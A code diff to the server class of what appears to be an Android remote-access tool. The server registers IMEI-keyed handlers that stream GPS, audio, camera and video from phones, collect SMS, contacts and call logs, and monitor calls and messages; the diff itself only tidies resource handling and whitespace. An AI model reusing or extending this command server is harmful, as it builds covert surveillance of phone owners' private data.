@@ -81,13 +81,14 @@ public class Server implements Controler {
 	public Server(int port) {
 		if(port == 0) {
 			try {
-	            Scanner sc = new Scanner(new FileInputStream("config.txt"));
-	            if(sc.hasNextInt()) port = sc.nextInt();
+	            try (Scanner sc = new Scanner(new FileInputStream("config.txt"))) {
+					if(sc.hasNextInt()) port = sc.nextInt();
+				}
 			} catch (Exception e) {
 				port = 9999;
 			}
 		}
-		
+
 		Nclient = 0;
 		serverPort = port;
 		clientMap = new HashMap<String, ClientHandler>();
@@ -104,11 +105,11 @@ public class Server implements Controler {
 		setOnline();
 
 	}
-	
+
 	public static void main(String[] args) {
-		Server s = new Server(0);
+		new Server(0);
 	}
-	
+
 	public void savePortConfig(String newPort) {
 		try {
 			BufferedWriter bw = new BufferedWriter(new FileWriter(new File("config.txt"), false));
@@ -143,10 +144,10 @@ public class Server implements Controler {
 				gui.logErrTxt("ERROR while establishing a connection");
 			}
 		}
-		
+
 		gui.logTxt("*** SERVER STOPPED ***\n");
 	}
-	
+
 	public void setOffline() {
 		online = false;
 	}
@@ -216,7 +217,7 @@ public class Server implements Controler {
 	 * Method that affect Handler & Packet to the right channel in the
 	 * ChannelDistributionHandler It send the target channel, the command and
 	 * the optionnal argument to the mux (then the client)
-	 * 
+	 *
 	 * @param imei
 	 *            Id of the client
 	 * @param command
@@ -232,75 +233,75 @@ public class Server implements Controler {
 			gui.logErrTxt("Client not available anymore. Cannot send command: "+command);
 			return;
 		}
-			
+
 		if (command == Protocol.GET_GPS_STREAM) {
 			if (!channelHandlerMap.get(imei).registerListener(channel, new GPSPacket()))
 				gui.logErrTxt("ERREUR: The virtual channel " + channel + " already registered!");
 			channelHandlerMap.get(imei).registerHandler(channel, new GPSHandler(channel, imei, gui));
 			gui.saveMapChannel(imei, channel);
-			
+
 		} else if ((command == Protocol.GET_ADV_INFORMATIONS)) {
 			if (!channelHandlerMap.get(imei).registerListener(channel, new AdvancedInformationPacket()))
 				gui.logErrTxt("ERROR: channel " + channel + " is already in use!");
 			channelHandlerMap.get(imei).registerHandler(channel, new AdvInfoHandler(channel, imei, gui));
-			
+
 		} else if ((command == Protocol.GET_PREFERENCE)) {
 			if (!channelHandlerMap.get(imei).registerListener(channel, new PreferencePacket()))
 				gui.logErrTxt("ERROR: channel " + channel + " is already in use!");
 			channelHandlerMap.get(imei).registerHandler(channel, new PreferenceHandler(channel, imei, gui));
-			
+
 		} else if ((command == Protocol.GET_SOUND_STREAM)) {
 			if (!channelHandlerMap.get(imei).registerListener(channel, new RawPacket()))
 				gui.logErrTxt("ERROR: channel " + channel + " is already in use!");
 			channelHandlerMap.get(imei).registerHandler(channel, new SoundHandler(channel, imei, gui));
 			gui.saveSoundChannel(imei, channel);
-			
+
 		} else if ((command == Protocol.GET_PICTURE)) {
 			if (!channelHandlerMap.get(imei).registerListener(channel, new RawPacket()))
 				gui.logErrTxt("ERROR: channel " + channel + " is already in use!");
 			channelHandlerMap.get(imei).registerHandler(channel, new PictureHandler(channel, imei, gui));
 			gui.savePictureChannel(imei, channel);
-			
+
 		} else if ((command == Protocol.LIST_DIR)) {
 			if (!channelHandlerMap.get(imei).registerListener(channel, new FileTreePacket()))
 				gui.logErrTxt("ERROR: channel " + channel + " is already in use!");
 			channelHandlerMap.get(imei).registerHandler(channel, new FileTreeHandler(channel, imei, gui));
-			
+
 		} else if ((command == Protocol.GET_CALL_LOGS)) {
 			if (!channelHandlerMap.get(imei).registerListener(channel, new CallLogPacket()))
 				gui.logErrTxt("ERROR: channel " + channel + " is already in use!");
 			channelHandlerMap.get(imei).registerHandler(channel, new CallLogHandler(channel, imei, gui));
 			gui.saveCallLogChannel(imei, channel);
-			
+
 		} else if ((command == Protocol.GET_SMS)) {
 			if (!channelHandlerMap.get(imei).registerListener(channel, new SMSTreePacket()))
 				gui.logErrTxt("ERROR: channel " + channel + " is already in use!");
 			channelHandlerMap.get(imei).registerHandler(channel, new SMSHandler(channel, imei, gui));
 			gui.saveSMSChannel(imei, channel);
-			
+
 		} else if ((command == Protocol.GET_CONTACTS)) {
 			if (!channelHandlerMap.get(imei).registerListener(channel, new ContactsPacket()))
 				gui.logErrTxt("ERROR: channel " + channel + " is already in use!");
 			channelHandlerMap.get(imei).registerHandler(channel, new ContactsHandler(channel, imei, gui));
 			gui.saveContactChannel(imei, channel);
-			
+
 		} else if ((command == Protocol.MONITOR_CALL)) {
 			if (!channelHandlerMap.get(imei).registerListener(channel, new CallStatusPacket()))
 				gui.logErrTxt("ERROR: channel " + channel + " is already in use!");
 			channelHandlerMap.get(imei).registerHandler(channel, new CallMonitorHandler(channel, imei, gui));
 			gui.saveMonitorCallChannel(imei, channel);
-			
+
 		} else if ((command == Protocol.MONITOR_SMS)) {
 			if (!channelHandlerMap.get(imei).registerListener(channel, new ShortSMSPacket()))
 				gui.logErrTxt("ERROR: channel " + channel + " is already in use!");
 			channelHandlerMap.get(imei).registerHandler(channel, new SMSMonitorHandler(channel, imei, gui));
 			gui.saveMonitorSMSChannel(imei, channel);
-			
+
 		} else if (command == Protocol.CONNECT) {
 			channelHandlerMap.get(imei).registerListener(channel, new CommandPacket());
 			channelHandlerMap.get(imei).registerListener(1, new LogPacket());
 			channelHandlerMap.get(imei).registerHandler(1, new ClientLogHandler(channel, imei, gui));
-		} 
+		}
 		else if ((command == Protocol.GET_VIDEO_STREAM)) {
 			if (!channelHandlerMap.get(imei).registerListener(channel, new RawPacket()))
 				gui.logErrTxt("ERROR: channel " + channel + " is already in use!");
@@ -333,7 +334,7 @@ public class Server implements Controler {
 		 * channelHandlerMap.get(imei).getPacketHandlerMap(c); } while(!(p
 		 * instanceof VideoHandler));
 		 * channelHandlerMap.get(imei).removeListener(c); }
-		 * 
+		 *
 		 * else if(command == Protocol.STOP_MONITOR_SMS) { PacketHandler p = new
 		 * CommandHandler();int c = 0; do { c++;
 		 * if(channelHandlerMap.get(imei).getPacketHandlerMap(c) != null) p =
@@ -353,16 +354,16 @@ public class Server implements Controler {
 			args = nullArgs;
 		clientMap.get(imei).toMux(command, channel, args);
 	}
-	
+
 	public void commandFileSender(String imei, short command, byte[] args, String dir, String name) {
 		int channel = channelHandlerMap.get(imei).getFreeChannel();
-		
-		if (!channelHandlerMap.get(imei).registerListener(channel, new FilePacket())) 
+
+		if (!channelHandlerMap.get(imei).registerListener(channel, new FilePacket()))
 			gui.logErrTxt("ERROR: channel " + channel+ " is already in use!");
-		
+
 		channelHandlerMap.get(imei).registerHandler(channel, new FileHandler(channel, imei, gui, dir, name));
 		//gui.saveFileChannel(imei, channel);
-		
+
 		byte[] nullArgs = new byte[0];
 		if (args == null) args = nullArgs;
 		clientMap.get(imei).toMux(command, channel, args);
@@ -378,7 +379,7 @@ public class Server implements Controler {
 			args = nullArgs;
 		clientMap.get(imei).toMux(command, channel, args);
 	}
-	
+
 	public void DeleteClientHandler(String i)
 	{
 		if(clientMap.containsKey(i) && channelHandlerMap.containsKey(i))
@@ -387,7 +388,7 @@ public class Server implements Controler {
 			   channelHandlerMap.remove(i);
 			   gui.deleteUser(i);
 			   gui.logTxt("Client "+i+" has been deleted due to it's disonnection");
-				
+
 			}
 		else
 			gui.logErrTxt(i+"client's data couldnt't be deleted after it's disonnection");
